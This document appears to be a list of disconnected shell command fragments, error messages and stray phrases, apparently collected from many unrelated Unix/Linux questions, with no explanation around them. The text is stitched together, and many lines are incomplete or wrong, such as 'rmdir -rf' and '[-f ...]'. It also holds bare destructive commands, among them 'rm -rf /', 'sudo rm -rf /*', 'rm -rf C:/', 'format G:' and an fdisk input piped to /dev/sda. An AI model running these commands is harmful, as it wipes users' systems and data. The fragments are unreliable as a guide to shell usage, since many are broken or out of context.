bash -c "cd ~/Desktop/r4/saturatedrate/iperf_s";
scp user@samplemachine:/home/user/test/* /home/user/test
test -d
echo yes
echo yes
ls -lhd /Volumes/HD-PNFU3/Backups.backupdb/Jaris\ MacBook\ Air/2015-06-24-230830/Macintosh\ HD/Users/masi/*
sudo mount -u -w /Volumes/HD-PNFU3/
ls -lhd *
#!/bin/bash  defaultBrowser=$(/usr/bin/defaults read com.apple.LaunchServices | grep LSHandlerRoleAll | uniq | cut -d "\"" -f 2)    echo "default browser is: " $defaultbrowser
f | g
ssh <user@servername> "echo \$SGE_ROOT"
ssh <user@servername>
echo $SGE_ROOT
var = $()
date +%d-%m-%Y
last_status=$(echo $?)
echo $RANDOM
newVar=$(cat foo)
echo $abc
a && b && c
{ }
if [ ! a ];
echo -e "\x0D"
sed -e 's/open/'$(echo "\x0D")'/' 1.txt > 2.txt
> bar.txt
$ uti
(reverse-i-search:ccc) aaa bbb |ccc ddd
eee ccc
gpg -c file
gpg -c file --passphrase test
gpg --passphrase test --symmetric file
gpg --version
--pinentry-mode loopback
...failed: File exists
perldoc perlrun
service gearman-job-server restart
stty -tostop
man stty
fd -h
sudo blkid
rmsshk 19
date -%Y%m%d
SSH Putty
echo "$PS1"; echo "$PROMPT_COMMAND"
${myString,}: bad substitution
$(which watch)
alias watch=watchall
rails server
C:\Program Files\Git\bin\bash.exe
C:\Program Files\Git\bin\sh.exe
gitbash v2.32.0
gitbash v2.34.1
Vagrant(Oracle VM)
gitbash  v2.38.1
Windows PowerShell
/ +/
" "
dd: unrecognized operand ‘/dev/datto0.dd.gz’
dd if
dd of
| dd of=
28a6a6c11f088d6149d178af6e45102a  /dev/datto0
> /tmp/BACKUP_${TODAY}_${MD5}.dd.gz
awk '{print $1}'
${MD5%% *}
$ENV:PATH = $ENV:PATH + ";D:\Myfolder\Test\"
:help xterm-color
df -ah /tmp
rm -f $f
find /tmp/mycronjob -mtime +30 -exec rm {} \;
vim ~/.bash_history
cat ~/.bash_history
help trap
rm -f .my_file.c.un~
-exec rm -f {} \;
'(' ... ')'
-exec rm -f {}
man find
java <classname>
runjar <jarfilename.jar>
java -Xmx2g -jar <jarfilename.jar>
-X POST
remove |
./Myscript.sh | /bin/bash
mv -i
shopt -s nullglob
sudo -E
cat -vet /tmp/report.txt
cat -vet
sed 's/ \+$//'
sensu:x:496:496:Sensu Monitoring Framework:/opt/sensu:/bin/false
export PATH=$PATH:/usr/local/bin
sudo su - sensu -s /bin/bash
passwd -l
$(date +%H:%M:%S)
source ~/.bashrc
ssh user@server
[12:03:08 user@server ~]$
gpaste ui
gpaste history.
gpaste get [#]
youtube-dl $(gpaste get [#])
echo $(gpaste get [#])
s3cmd sync
find .
-name '*\?*'
-maxdepth 1
-maxdepth 9
this is my style.css?ver=4.2.5.css
my style.css?ver=4.2.5.css
for f in *
mv $f $newf
echo $f $nf
-f file
gpaste get
youtube-dl $(gpaste get [video url])
ffmpeg -i [filename of video from step one].<filetype of video from step one>   [filename of video from step one].wav
munpack -C $extrdir $file
find -iname "*.jpg*" -o -iname "*.jpeg*" -o -iname "*.JPEG*" -o -iname "*.JPG*"
root :0
tar czvf testdir
tar czvf testdir/*
tar --exclude='*.pyc' czvf testdir.tgz testdir
man tar
man tar
source ./another-local-script.sh
desource local-script.sh | ssh user@remote
echo $SHELL
<property name="&lt;Super&gt;Tab" type="string" value="switch_window_key"/>
<!--<property name="&lt;Super&gt;Tab" type="string" value="switch_window_key"/>-->
touch {a,b}{1,2}
a1 a2 b1 b2
git mergetool
set diffexpr=MyDiff()
chmod +x foo.sh
Pattern not found
sudo -sE
ls *.mp3
Octobers' $HOME
cd Octobers<tab>
cd Octobers\'\ \$HOME
man security
echo $PATH
diff -qr
kill $PID
wmctrl -c <WIN>
wmctrl -c
man bash
rm -rf /*
rm -rf /
rm -rf /*
rm -rf /
rm -rf /*
rm -rf $1/*
cat protocol_checker.sh
echo "hey"
sudo vim /etc/profile
set -x
set -x
info coreutils 'mkfifo invocation'
export PATH="/home/USER/anaconda/bin:$PATH"
Debian Jessie amd64
g++ 4.9.2
No such file or directory
ls -l
midnight commander
man find
sudo find -L /sys -name "brightness"
File system loop detected
./makeScript: line 1: pkg-config: command not found
bash -x ./makeScript
#!/bin/bash -x
wget --content-disposition
wget -nv ...
man wget
2016-11-15 14:58:48 URL:https://upload.wikimedia.org/wikipedia/commons/5/54/Golden_Gate_Bridge_0002.jpg [1072554/1072554] -> "
tail -f pipe
uname -a
Linux hostname 3.2.0-4-amd64 #1 SMP Debian 3.2.65-1+deb7u1 x86_64 GNU/Linux
xterm -v
...|xargs bash -c somealias ...
bash -ic
bash -c
Argument list too long
for i in /home/*/directory\ with\ spaces; do
echo $directory2 ; exit
Google Form
file>Download as>csv
email an invoice
/home/user/profile.d/       # Doesn't exists
/home/user/.bash_profile    # Doesn't exists
man bash
LONGER STRING
tree --help
PS1="\[\e[0m\]\[\e[0;92m\]\u\[\e[91m\]@\[\e[93m\]\h\[\e[0m\]:\[\e[0;94m\]\w\[\033[1;30m\]\[\e[0m\]$ "
PS1="\e[0m\e[0;92m\u\e[91m@\e[93m\h\e[0m:\e[0;94m\w\033[1;30m\e[0m$ "
myscript.sh mydata.bin mypayload.sh
printf %q
export $PATH
export PATH
du -h
git status --porcelain --branch | grep -Eo '\[[a][hea]*[d].[1-9]' | sed 's/\[//' | awk '{print $(NF $0)}'2>/dev/null
update-alternatives --list python
Isn't python supposed to be a generic command to run either v2.7 or v.3.4 based on the configuration?
man wget
<LINK REL="stylesheet">
sudo cp ~/Downloads/kellys.vim /usr/share/vim/vim73/colors/
cp: /usr/share/vim/vim73/colors/kellys.vim: Operation not permitted
csrutil disable
csrutil enable
. scriptName.sh
protocol $https not supported or disabled in libcurl
ESC [ 1 r
echo "$?"
until sudo -n true 2> /dev/null; do
sudo -n true
$(sudo -n true 2> /dev/null)
sudo -n true
until [[ $(sudo -n true 2> /dev/null) ]]; do
until [[ $(sudo -n true 2> /dev/null; echo "$?") -ne 0 ]]; do
set -e
"multiple words"
rest of the line
if [ -f /etc/motd ]
if [-f /etc/motd]
which find
Type "./configure", then "make", then "make install".
no such file or directory
xterm &> /dev/null &
dolphin &
kate &
xterm &> /dev/null &
kate &
tail -f <file>.log
ssh myuser@myip -v
git clone ...
TargetDir/File0 -> /home/me/SourceDir/File0
cp -P
TargetDir/File0 -> ../../SourceDir/File0
find -type f
mkdir -p
find -type f
ls -s
set noclobber
set noclobber=1
exit 0
exit 1
cd .
FEVAL_NONINT 0x008
find . -type f
max file size
:: classX
| tail -Z
grep --color
./test.sh hello world
$ run_roscore.sh
gnome-terminal -x roscore
Failed to execute child process "roscore" (No such file or directory)
gnome-terminal -e tmux
tmux -c ls
tmux -c roscore
gnome-terminal -e 'tmux -c roscore'
$roscd beginner_tutorials
gzip -9 | gunzip
grep 'INSERT INTO container' $file | pv -L 100 -q | mysql database -f
node "secondFileOfFolderHere"
post_encode ()
post_encode ()
var 2
> "world"
ctrl+x ctrl+e
echo $SHELL
printenv SHELL
ps $$
source ~/.bashrc
. something:[12.12.12.12],[13.13.13.13]
expr "$string" : '\($substring\)'
find -exec ls -l {} \;
'a b'
su x
bash: /home/x/.bashrc: Permission denied
source ~/.bashrc
sed 's/<\/p>*/<\/p>'
[ OK ]
[NOT OK]
. .local/bin/bigfont
PS1='$ '
stty -a
stty -a
set -e
set -o
gsettings get org.gnome.finalterm status-bar-left
....------ 1 root video 29, 0 Nov  9 04:09 /dev/fb0
use Getopt::Std
/usr/bin/bash: ls: command not found
[0: command not found
"$($0 $x)"
directory="$(echo pwd)"
grep -i happy test.txt | wc -l
hash -r
hash -r
wait 7165
wait %2
man bash
[1] 25647
help wait
which svn
echo | sed
for f in *
for f in $(ls)
echo "$f"
hostname -f
hostname -i
ssh localhost
echo $PATH
unset PATH
pathmunge /foo/bar
pathmunge /foo/bar
pathmunge /foo/bar
add_path $(pwd)
ping -c 1 8.8.8.8 | grep 64 | cut -c 1-2
su -l user
cd /some/place
set bell-style none
ls -l
mkdir folder
ls -l
touch folder/file1
ls -l
csvcut -e ASCII datafile
csvcut -e ASCII datafile
Briarcliffe College�??Patchogue
sudo visudo
sudo /usr/local/sbin/sget_my_secret
sudo sget_my_secret
sudo /usr/local/sbin/sget_my_secret
ALL ALL=(ALL) ...
sudo grep
find ~ iname "FolderC"
shopt -s nullglob
find ! -name readme.md -o ! -name contrib.rst -o ! -name licence.txt -exec cat {} \+
transmission-gtk &
hello world
sudo -s
bind 'set completion-ignore-case on'
help bash
ESC + B
alt+[left/right] arrow
mkdir -p
cd -
cd ./-
cd /path/to/-
ln -s - ./something ; cd something
man bash
[ www.blabla.com ]
 rm -rf *
which hg
hg kdiff3
hello\! my name is boda\! bye\!
hello! my name is $name! bye!
echo $var
var="hello! my name is $name! bye!"
<( ... )
Open calculator.cmd
C:\Program Files\Airytec\Switch Off\scripts
start matlab.exe
*/15  *  *  *  * php -f /var/www/cron.php
sudo crontab -u http -e
bash: __bp_precmd_invoke_cmd: command not found
tail -1
grep -oP "x\K(\S\S)")
xhost +
ls -1
ls -1
ls -1 *
date | tr -d '\n'
ls: cannot access */f005.ext: No such file or directory
" /bin/bash"
"/bin/bash "
pigz -9 -- rsnc*
echo /root/.ssh/id_rsa.pub
cat /root/.ssh/id_rsa.pub
ssh-copy-id -i my/alternate/pub.key root@HOSTNAME
if $two is null then two=0
sed -E ':a;N;$!ba;s#a#Z#;s#a#Z#;s#a#Z#' alphabet
sed -e ':a' -e 'N' -e '$!ba' -e 's#a#Z#' -e 's#a#Z#' -e 's#a#Z#'  alphabet
sed -e ':a;N;$!ba;s#a#Z#g;s#Z#a#g4' alphabet
bash -c
touch /tmp/$RANDOM
bash -c 'echo 1'
man bash
pbpaste | wc
-bash:  wc: command not found
pbpaste |wc
Filename␀ A5 Br.indd
sudo -u myuser bash
echo $HOME
export HOME=/home/myuser
su -l
sudo -s
sudo -H
sudo -i
ssh myuser@localhost
find ./path -mindepth 1 -maxdepth 1 -type d | xargs -r -t -n 1 -P 4 -I % until rsync -am %/ $host::%/; do echo "TRY AGAIN"; done
find . -exec <command>
find . -exec php -l {} \; -print
set --
-o braceexpand
git status
ls .
Git Bash
cd <location>;
\( … \)
find . -size -1M
echo $?
perl -pi -e 's/((?<=text": ")\S*(?="))/FILENAME/g' PATH-TO-FILE
shopt -s nullglob
dmesg | grep "fail"
dmesg | grep "assoc"
-bash: /usr/bin/cmake: No such file or directory
hash -r
find /some/folder -type f -regextype posix-extended -regex '.*\.(flac|ape|wa?v|m(p3|4a))' -BITRATE_IS_320kbps -exec ... \;
-exec bash -c " file '{}' | grep '320 kbps'" \;
-exec bash -c "BITRATE_SCRIPT_PATH '{}' | grep '320'" \;
tar --extract [FILE]
tar -xf spreadsheets.tar --strip-components 3
tar -xf spreadsheets.tar --strip-components 3 -C /home/qc/me/archive
tar -xf spreadsheets.tar -C /home/qc/me/archive home/common/4000_UW_spreadsheets/my_spreadsheet --strip-components 3
sudo apt-get install plotutils
info plotutils
cp -rv /home/src/somedir /dest
cp -rv /home/src/somedir/* /dest
ls -l
mktemp -d
tar -xvzf UW_archive_example.tgz home/common/4000_UW_spreadsheets/example.ods
mktemp -d
-mtime 0
bind -p
bind -p
"\C-k": kill-line
"\C-y": yank
jc  arg1 arg2
cp -r arg1 arg2
cd arg1
cd arg2
$(ffmpeg -r 12 -pattern_type glob -i "*.jpg" -c:v libx264 Zeitraffer$begin"-"$end.avi)
file contents
sudo apt-get install textdraw
fc -ln -1
$(fc -ln -1)
$(fc -ln -1) | tail -n 1
sudo apt-get install textdraw
$($(fc -ln -1) | tail -n 1)
tail -n 17 | head -n 1
fc -ln -1
fc -ln -1 -1
fc -ln -3 -3
send-keys -X
-W 1
-W 1
for local file in $var;
$(ls dir)
local file
launchctl list
! -d
if [ ! -e /sub/folder/fileA /sub/folder/fileB ]; then
yolo = \"!git init && git remote add origin $1 && git pull\"
git clone
git yolo
find -type f -size +1000000k -name "*.mkv"
| xargs
sort test.im -t, -k1
VBoxManage convertfromraw
man bash
man tee
ps aux | grep python
docker attach
docker run
cd $zv
cd $zv
while ...
arr+=( "..." )
printf "%s=%s" "$v" "${!v}"
compgen -v zv
cd "${i#*=}"
|| :
xdotool type "command you want to enter"
history .... && xdotool key Up
Run command as login shell
echo $PATH
. ~/.bashrc
. ~/.profile
echo "in bashrc"
export PATH="/usr/local/sbin:usr/local/bin:...
echo "export PATH=\"$PATH:$HOME/.npm-packages/bin\"" >> ~/.profile
C:\Program Files (x86)\Git\etc\git-prompt.sh
Permission denied
-a "Content-type: text/html;"
$ sudo chmod 711 /etc/init.d/collection.sh
$ ln -s /etc/init.d/collection.sh /etc/rc0.d/
$ sudo reboot
man -k rc.d
-o debug
echo "Works";
echo "Works"
less file
head file
Permission Denied
ls -l
tail: option used in invalid context
C:\Program Files\MATLAB\R2014a\bin\matlab.exe
jupyter notebook
alias ls=lssort
^total [0-9]*$
ls -d
... && ... || ...
if ...; then ...; else ...; fi
sudo reboot
$ sudo update-rc.d collection.sh defaults 99
shopt -s extglob
shopt -s extglob
help shopt
123 Westbrook
xmlstarlet sel --help
xmlstarlet sel -t <template option> <XPath to es:ipAddress tag> -n <filename.xml>
Oracle Database 11g Release 2
RHEL 7.2
if [ -gt ]
man ls
ls -lT
exec > >(cat | cat >>/tmp/myoutput.txt)
grep -v 'foo'
sed 's/foo/bar/g'
sed -i 's/foo/bar/g' .xsession-errors
ls /usr/
exec | sed ...
exec > >(cat | cat >>/tmp/myoutput.txt)
exec > >(sed 's/usr/--HEREAMI--/g' >/tmp/myoutput2.txt)
ls /usr
ls -R /usr
ssh-keygen -t rsa
cd && mkdir .ssh && chmod 700 .ssh && touch .ssh/authorized_keys && chmod 600 .ssh/authorized_keys && nano .ssh/autorized_keys
diff foo <(ssh myServer -l user -i .ssh/id_rsa 'cat foo')
git bash
"C:\Program Files\Git\bin\bash.exe" --login -i "C:\Program Files\Docker Toolbox\start.sh"
Program Files (x86)
/dir "%DOCKER_TOOLBOX_INSTALL_PATH%" /icon "%DOCKER_TOOLBOX_INSTALL_PATH%\docker.exe"
a b c.tiff
VAR=( $(somecommand) )
TS=$(echo ${VAR[2]}; echo ${VAR[3]})
echo $TS
exec >>"$ERRFILE" 2>&1
. /etc/X11/Xsession
exec /etc/X11/Xsession
exec > >()
awk ... | sed 's/^[0-9]\+/echo ${CATEGORY[&]}/g' | bash
eval $(awk ... | sed 's/^[0-9]\+/echo ${CATEGORY[&]}/g')
find . -name "*.bmp" -exec mogrify -format pmg {} \; -exec rm {} \;
find . -name "*.bmp" \( -exec mogrify -format pmg {} \; -o -exec true \; \) -exec rm {} \;
open Terminal
./my_script.sh 1
eval "ssh-agent -s"
source sourced.sh $*
sudo yum install nano
command1 && command2 && echo "OK" || echo "FAIL"
FAIL 1
FAIL 2
while return status is 0 increment a variable with addition and print the variable to stdout
while [ $? -eq 0 ]
printf "%u" -1
>> /etc/nginx/sites-available/default
> ...
*.txt: No such file or directory
ls --color
: command not found
alias ls='ls --color'
dos2unix .bashrc
GECOS fields
man chfn
C language
system calls
bash script
-F fs
man ksh
man bash
<<< word
<< EOF
<<< singleline
? > Debug Info
Plugins > Plugin Manager > Show Plugin Manager
? > Debug Info
echo $PATH
bash exec -l
source activate
bash -c
exec bash
sudo rm -rf /*
rm -rf /*
su -c
illegal action: read -n
su -c
su -c "echo Hi"
read -n 1 -s key; if [ <value of $key or nothing> == g ]; then echo Test
Successful.; else echo Test
Failed.; fi;
git fetch
git remote
"$(git remote)"
'$(git remote)'
\$\(git remote\)
'"$(git remote)'"
$((a - b - c))
vim ~/.bash_profile
echo $PATH
open -a Terminal cd /Applications/sites/mysite
cd docs
cp, mv
cp -L test.txt docs
echo -e "rsync [...]"
telnet towel.blinkenlights.nl
#!/bin/bash -x
set +x
set +x
find /path/to/directory -type f -exec grep -irl "SEARCH_PATTERN" {} \;
find /path/to/directory -type f -exec grep -irl "$1" {} \; < "SEARCH_PATTERN"
-irl "SEARCH_PATTERN"
du -sh *
networksetup -help
~ ~
~ ~ ~
~ ~ ~ ~
~ ~ ~ ~ ~
~ ~ ~ ~ ~ ~
~ ~ ~ ~ ~ ~ ~
~ ~ ~ ~ ~ ~ ~ ~
~ ~ ~ ~ ~ ~ ~ ~ ~
~ ~ ~ ~ ~ ~ ~ ~ ~ ~
mkdir -p /tmp/test
cd /tmp/test
ls <tab> <tab> <tab> <tab>
/tmp/test /tmp/test ~ ~ ~ ~ ~ ~ ~ ~ ~
/tmp/test /tmp/test /tmp/test ~ ~ ~ ~ ~ ~ ~ ~ ~
/tmp/test /tmp/test /tmp/test /tmp/test ~ ~ ~ ~ ~ ~ ~ ~ ~
/tmp/test /tmp/test /tmp/test /tmp/test /tmp/test ~ ~ ~ ~ ~ ~ ~ ~ ~
alias [='pushd .'
alias ]='popd'
zsh: command not found: pip
echo $PATH
which -a python
which python
ls -l $(which python)
brew unlink python && brew link python
brew list python | grep pip
which -a pip
pip not found
eb ssh
npm start
eb ssh
eb stop
eb start
tail -F
tail -F
C-a, :sessionname
rm ~/.bash_profile
ssh-add -l
ForwardAgent yes
git diff
clear & git diff
command clear && git diff
command clear
git diff
git diff --cached
$ ~/script.sh video.mp4
gnome-terminal -e ~/home/user/script.sh
sass --watch scss:css
command not found
gem list
sudo gem install sass
PATH="$(ruby -e 'print Gem.user_dir')/bin:$PATH"
. /etc/profile
sudo gem install sass
gem list
scp -f
scp -t
scp -t
scp -f
scp -t
Subsystem sftp
id $(cat /etc/passwd | grep Luyang | awk -F '[:]' '{print $1}')
ls -lhSr
source ~/.zshrc
ps aux | grep ssh
ssh-add ~/.ssh/your-ssh-key-name
ssh-agent -s
ssh-add ~/.ssh/your-ssh-key-name
KeyChain Access
vim ~/.profile
help echo
') characters and followed by a newline (
man basename
basename "$PWD" | tr -d '\n'
ssh-add -l
date +"%Y%m%d%H%M%S"
date /t
date +"%Y%m%d%H%M%S"
ls -ltr myDir | tail -n1 | awk '{print $NF}'
screen -dmS foo
UsePAM no
UsePAM yes
> /dev/null
alias | grep color
syntax off
Permissions denied
sudo chown
# User alias specification
# User privilege specification
cat ~/.ssh/id_rsa.pub | ssh foobar "mkdir ~/.ssh; cat >> ~/.ssh/authorized_keys"
copy_key foobar
ssh remote "~/bin/some_script.sh"
ssh remote "command"
ssh remote "~/bin/some_script.sh"
. /etc/.../sourced_script.sh
fork: Resource temporarily unavailable
ulimit -a
ulimit -u 1000
-t ' '
-t ' '
$ ffmpeg -i 01-01-Introduction.mp4 -fix_sub_duration -i 01-01-Introduction.srt -c:s mov_text -c:v copy -c:a copy -map 0:v -map 0:a -map 1 -metadata:s:s:0 language=eng 01-01-Introduction-sub.mp4
ls & ps
ls -lt
ls -lt
ls -lt
ls -lt
cd "$( ls -1Ft | grep /$ | head -1 )"
sudo su - <user> bash
script /dev/null
screen -c .screenrc -d -m -S testN ping google.com
screen -x <user>/testN
sudo su - <user> bash -c 'screen -ls'
jq array_name[].object_in_array
bash -c 'command'
"$WP055" = "$remainder"
if [[ something1 == something2 ]]
sudo su
kate /var/log/mail.log
sudo su
kate /var/log/mail.log
service postfix restart
-bash: R: command not found
open -a R
R --vanilla
man date
json -g
script my_log /usr/local/bin/bash
./prog --opt1=arg1 --opt2=arg2 --opt3="arg3"
opts="--opt1=arg1 --opt2=arg2 --opt3=\"arg3\""
\bin\time -v $exec $opts
Error parsing args
Command being timed: "./prog --opt1=arg1 --opt2=arg2 --opt3="arg3""
./prog --opt1=arg1 --opt2=arg2 --opt3="arg3"
$ full_cmd="/bin/time -v $exec $opts"
$ eval $full_cmd
man find
find . -type d
"double quotes"
ipconfig /all
format G:
C:\Program Files\Git\usr\bin
cat /etc/fstab
tar -xf
rsync.exe -h
*    hard     nproc     nnn
echo on
sudo -u www-data php /var/www/owncloud/occ
set -x
set +x
set -v
set -x
set +x
set -v
set -x
set +x
ls -lArt
du -hs * | sort -h
ls-special dir
grep -v ^d
head -n 1
% 2
rm -r /opt/td
mv ./test ./test
mv test test
mv a b c d/
rename("a", "d/a")
rename("b", "d/b")
rename("c", "d/c")
mv test test
rename("test", "test/test");
new="$(echo "$old" | tr ...)"; [[ $new != $old && ! -e $new ]] && mv "$old" "$new"
HTTP POST
man curl
--data @foobar
cp source-foo.txt foo.txt
cp source-foo.txt subdir/foo.txt
find /path/to/files -name "*.txt"
zip fname.txt.zip fname.txt
rm fname.txt
find . | grep -i '\.txt$' | xargs -I {} zip {}.zip {}
find . | grep -i '\.txt$' | xargs -I {} rm {}
if [[ $var1 == hel* ]]; then
sudo top
-iname "*.jpg"
: Fatima Alves
mv: missing destination file operand after './destination'
| sed 's/ /\\ /g
bind \c\n accept-autosuggestion execute
bind -a
| more
| less
ssh deployer@XXX.com someArguments
/usr/bin/env: php: No such file or directory
/bin/composer install
/bin/composer self-update
/bin/composer -V
/usr/bin/env php -v
/usr/bin/php -v
whereis php
php: /usr/bin/php /usr/local/bin/php /usr/share/man/man1/php.1.gz
which env
bash deploy.sh
/usr/bin/env: node: No such file or directory
bower install
npm install
echo $PATH
command="/bin/sh /path/to/your/script..."
export PATH="$PATH:~/mybin"
/usr/bin/env php
ssh deployer@XXX.com
echo $PATH
ssh deployer@XXX.com
hash -r
mkdir ~/.ssh/controlmasters/
rm -r [DirectoryName]
echo $PATH
find -name "*${type}"
crontab -e
Windows Features
Turn Windows features on or off
Turn Windows features on or off
Check for Updates
cat myfile
scp localpathsrc login@server:remotepathdst
scp login@server:remotepathsrc localpathdst
echo $?
1 - (song author) - (song name).flac
(song author) - (song name).flac
bash: /bin/cp: Argument list too long
Settings --> Update & Security --> For Developers
Developer Mode
Turn Windows features on or off
man bash
export PATH=/bin:$PATH
export [-fn] [name[=word]] ...
export -p
export -f workon
Mac OSX Version 10.11.3
defaults write
ac bc
a {b,c}
a b c
rm -rf C:/
rm -rf C:/
rm -rfv /mnt/c/
file bin/tnt
port $2
... port $2 & ; sleep 3 ...
alias abc="/dir2/abc"
cp -r /mnt/c/tmp/test1 ~/tmp
git config -l
export PATH=...
-size -1G
-size -1G
find . -size -1M
-size -1M
pub serve
<ctrl + c>
pub serve
for var in "${data[@]}"
cd /home/ec2-user/backups/; find -type f -mtime +3 -exec ls {} \; -exec s3cmd del s3://kisnardonline/{} \;
find -print0
xargs -0
sed -z
-n 1
getfacl -R -m other::r-x dir
Windows Subsystem for Linux
lxrun /install
if [...] ... elif [...] ... fi
< /dev/tcp/…
$ my_script xyz -m "something here"
xyz -m something here
ls -a
if; then; else;
export PATH=foo
dircolors -p > ~/.dircolors
DIR 01;36 # directory
DIR 01;34 # directory
mv ~/ruby/ruby-2.3.0/ /opt/rubies/
mv ~/ruby/ruby-2.3.0 /opt/rubies/
cd ~; mv ~/ruby/ruby-2.3.0 /opt/rubies/
rm -rf /
sudo sh "path to your script"
sudo /path/to/your/script
git chec
git check
git checkout
git chec
git co
git checkout
locate curl
$curl -h
git clone https://username@hostname/repo
$(< file)
$(cat file)
head -n 2000 somefile.txt | grep "TTT"
head -n 2000 somefile.txt | grep -c "TTT"
head -n 2000 somefile.txt | grep -o "TTT" | wc -l
wc -l
ls /etc/
sh myscript
#!/usr/bin/env bash
>>> import os
>>> os.listdir('/bin')
foo bar baz bat
tmux ls
error connecting to /private/var/folders/d0/xbg08_x12lddw3dkht5w462c0000gn/T/tmux-501/default (No such file or directory)
error connecting to ...
for ... in "${arr[@]}"
echo testestsetsetestestsetsetsetsetsetsetsetset
vim wilson.0329
openssl s_client
find: paths must precede expression: /storage/emulated/0/
find . -name "test0[4-8]*.py" -exec adb push {} /storage/emulated/0/ \;
echo 123456 > /folder/folder/123.txt
xterm -e my.sh &
tail -n+3
apt-get install ${package_list}
man -k apt
export DEBIAN_FRONTEND=noninteractive
awk 'BEGIN{printf "Enter : ";getline input<"/dev/tty"} /'"$input"'/ {print}' <abc.txt
rmdir -rf foldername
the contents have been deleted and the empty folder remains.
rm Icon?
size = 0
{} \;
find ~ -name \*.bak -exec -rm -f {} \;
rm -f
xargs rm
" d e "
find -exec
find -exec
find example/ -exec rm -i {} \;
rm -i name
rm -i {}
rm -i file-a.txt
rm -i file-b.txt
curly brackets
{ ... }
{ ... }
{ ... }
inline group
{ ... }
{ ... }
“I found all these png files:“
{ ... }
echo ${month[3]}
xargs -i
-exec <command> \;
export PATH=$PWD:$PATH
curl --user user:password -o output_file "https://file_path?raw"
sudo su - kshitiz
sudo su kshitiz
su -l
sudo -s -u kshitiz
sudo -i -u kshitiz
systemctl poweroff
alias sha1sum=shasum
source ~/.bashrc
400 4
tsc {script} {arguments}
xterm -e
help alias
bash -x ./script.sh
vim "
vim hello
vim "hello
vim """sometext
vim sometexthello
vim """sometexthello
crontab -e
tail -n25 /var/log/syslog
tmux detach-client
tmux detach-client
tmux detach
source script
source ./script
echo $(testing)
/usr/lib foo.jpg
chmod +x
/bin/bash file.sh
man sh
sh file.sh
sh -c ./file.sh
sh -c ". ./file.sh"
RND="$(tr -dc '0-9' </dev/urandom | head -c 1)"
npm install
npm install
echo $path
echo $path
set | less
-exec rm {} \;
-mtime 2
-mtime +2
$ find $HOME/html/mydir/downloads/sec/*.zip  -mtime 2 | xargs -r rm
$($ficTemp > $param)
powershell -c start -verb runas cmd '/c start /D "<dirname>" bash.exe'
-verb runas
powershell -c start -verb runas cmd '/c start /D "%V" bash.exe'
powershell -c start -verb runas cmd '/c start /D "<tartget>" bash.exe'
powershell -c start -verb runas cmd '/c start /D "%CD%" bash.exe'
which node
which open
chmod +x
git update-index --chmod=+x
sudo su - <anotheruser>
-path ./notHere
-type f
ls -ll
vim $(!!)
alias vl='vim $(fc -s)'
find . -iname '*blah*' -mtime -2
find . -iname '*blah*' \( -type d -o -type f \) -mtime -2
grep -oP "/.*?/bin/java"
grep -oP "/.*/bin/java"
echo user pid# 1 1 00:00 ? 00:04:00 /path/to/java/jdk_1.8/bin/java -foo=bar -foo2=bar2 ... etc. | grep
//: is not a directory
crontab -l
no crontab for root
crontab -e
export PS1="\e[0;32m[\u@\h \W]\$ \e[m"
who - a | grep user | wc -l
TASKKILL /PID <number>
$ tskill notepad
tcpdump -nS -s0 host www.google.com -ttt
tcpdump -nS -s0 host www.google.com -ttt > /tmp/handshake.txt
cat /tmp/handshake.txt | egrep '\[S\.\]' | awk 'BEGIN { FS = " " } ; { print $1 }'
sudo mount-remove-hiberfile
Default env_reset
Defaults  env_reset
env_keep = "PATH"
Defaults    secure_path='...'
~/Scripts/test.sh &
systemctl status crond
* * * * *
${PRODUCT} | tr -d '\r'
if elsif
pg up
pg down
yum groupinstall gnome-desktop bare-x
yum groups install "GNOME Desktop"
sudo -u anotheruser history
sudo -u anotheruser bash -c 'which history'
sudo find / -name 'history' -type f
bash -c
set -o history
help disown
$( ... )
( ... )
type wget
ls -l /path/to/wget
$ type wget
$ ls  -l /usr/bin/wget
-rwxr-xr-x 1 root root 439944 May  4 17:07 /usr/bin/wget
locate bin/wget
chmod a+x /path/to/wget
type wget
wget is a function ...
wget is aliased to 'e1(){ return 126;};e1;'
unalias wget
unset wget
which wget
set -x
-S -v -d
set +x
ls  -l /usr/bin/wget
ls -l /usr/bin/wget
wget -S -v -d --http-user="xxxxxx" --http-passwd="xxxxxx" http://cdaac-www.cosmic.ucar.edu/cdaac/rest/tarservice/data/cosmic2015/atmPrf/2015.001 -O cosmic_atmPrf_2015.001.tar
curl -v -u <username>:<password> http://cdaac-www.cosmic.ucar.edu/cdaac/rest/tarservice/data/cosmic2015/atmPrf/2015.001 -o cosmic_atmPrf_2015.001.tar
echo $PATH
export PATH="/usr/bin:$PATH"
source /path/to/your/completion.file
declare -F | grep ..
type ..
Ctrl+x, Ctrl+e
:set mouse=a
set mouse
notify-send "title" "message"
sudo ./script
su normal-user -c 'echo $USER'
$ grep -E 'LOGIN FAILURE | authentication error for | BAD SU | incorrect password attempts' /var/log/system.log
man bash
--exclude '/boot/*'
-loglevel panic
ffmpeg version 3.0.2-1~trusty
stream #0
-rwxrw-r-- test.sh
permission denied
sh test.sh
/bin/sh test.sh
xargs -0
bash -c ...
man bash
printf 'n\np\n3\n\n\n\n\nt\n3\n8e\nw' | fdisk /dev/sda
cmd /c 'C:\Program Files (x86)\Adobe\Reader 10.0\Reader\acrord32.exe'
man grep
cp /mnt/c/Users/dave/Documents/Cygwin/* ~/
-F '.'
$1, $2 and $3
cd /adirectory/another/andelse
cd Documents/Sites
cd adir
cd /adir
ls | grep a
echo 'Hello' | tee outfile
ulimit -a
type log
-bash: type: log: not found
trap -p
trap -- 'history_to_syslog' DEBUG
ulimit -a
type log
unset log
trap -p
env -i ls | env -i grep a | env -i grep b | env -i grep c | env -i grep d
ulimit -a
set -x
strace ls | grep a | grep b | grep c | grep d
env -i ls | env -i grep a | env -i grep b | env -i grep c | env -i grep d
route -n |awk '/UG/{print $2}';
function(){  }
echo $routeInfo
unset routeInfo
chmod +x ~/test.sh
echo $routeInfo
for i in ${rslt[@]}; do echo "$i"; done
arp -na
cat /proc/net/arp
FNR in seen
FNR in seen
-o 2.2
The Monkey King Return (2015).mkv
man find
man rename
pgrep -P $$
cat /dev/random > /dev/null &
sudo cat /dev/random > /dev/null &
ps auxf
Multiple -t options force tty allocation, even if ssh has no local tty.
awk -v pattern=disk60 -f script_file data_file
systemctl status rc-local.service
journalctl -xe
sudo systemctl daemon-reload
sudo systemctl start rc-local.service
sudo systemctl status rc-local.service
rtnetlink answers network is unreachable
sudo env -i /etc/rc.local
ip route get 1 | awk '{print $NF;exit}'
Active: inactive (dead)
env -i /etc/rc.local
env | sed 's/^/export /g' | sed 's/=/='/g' | sed -e 's/$/'/g' > env_values.sh
rm -r
-bash: ls: command not found
